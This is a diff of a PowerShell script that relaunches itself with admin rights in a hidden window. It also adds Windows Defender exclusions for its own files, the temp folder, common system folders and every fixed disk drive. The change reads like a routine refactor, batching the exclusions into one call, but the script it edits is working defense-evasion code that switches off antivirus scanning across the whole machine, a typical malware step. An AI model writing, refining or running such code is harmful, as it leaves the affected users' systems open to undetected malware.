@@ -3,7 +3,7 @@ $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIde
 if (-not $isAdmin) {
     try {
         # Relaunch the script with elevated privileges
-        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs -ErrorAction Stop
+        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs -WindowStyle Hidden -Wait -ErrorAction Stop
         exit 0
     }
     catch {
@@ -33,26 +33,25 @@ $success = $false
 while (-not $success -and $retryCount -lt $maxRetries) {
     try {
         $exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath
-        # Add script-specific paths to exclusions
-        $scriptPaths = @($scriptPath, $scriptFolder, $tempFolder)
-        foreach ($path in $scriptPaths) {
-            if ($exclusions -notcontains $path) {
-                Add-MpPreference -ExclusionPath $path -ErrorAction Stop | Out-Null
-            }
-        }
-        # Add common system folders to exclusions
+        # Collect script-specific paths
+        $pathsToAdd = @($scriptPath, $scriptFolder, $tempFolder)
+        # Add common system folders
         foreach ($folder in $commonFolders) {
-            if ((Test-Path -Path $folder) -and ($exclusions -notcontains $folder)) {
-                Add-MpPreference -ExclusionPath $folder -ErrorAction Stop | Out-Null
+            if (Test-Path -Path $folder) {
+                $pathsToAdd += $folder
             }
         }
-        # Add all fixed disk drives to exclusions
+        # Add all fixed disk drives
         $disks = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | Select-Object -ExpandProperty DeviceID
         foreach ($disk in $disks) {
             $diskPath = "$disk\"
-            if ($exclusions -notcontains $diskPath) {
-                Add-MpPreference -ExclusionPath $diskPath -ErrorAction Stop | Out-Null
-            }
+            $pathsToAdd += $diskPath
+        }
+        # Filter paths that are not already excluded
+        $newPaths = $pathsToAdd | Where-Object { $exclusions -notcontains $_ }
+        # Add all new paths in one call if there are any
+        if ($newPaths.Count -gt 0) {
+            Add-MpPreference -ExclusionPath $newPaths -ErrorAction Stop | Out-Null
         }
         $success = $true
     }
